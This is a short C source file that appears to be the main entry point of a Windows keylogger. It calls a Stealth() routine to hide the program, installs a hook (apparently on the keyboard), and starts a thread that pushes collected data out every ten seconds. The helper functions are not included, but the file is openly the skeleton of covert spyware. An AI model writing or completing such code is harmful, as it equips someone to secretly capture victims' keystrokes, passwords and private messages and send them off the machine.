#include "push.h"
#include "keys.h"

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
    DWORD dwPushPeriodMs = 10000;

    Stealth();
    SetHook();

    DWORD dwThreadId = 0;
    HANDLE hPushThread = CreateThread(NULL, 0, &PushThread, (LPVOID) dwPushPeriodMs, 0, &dwThreadId);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}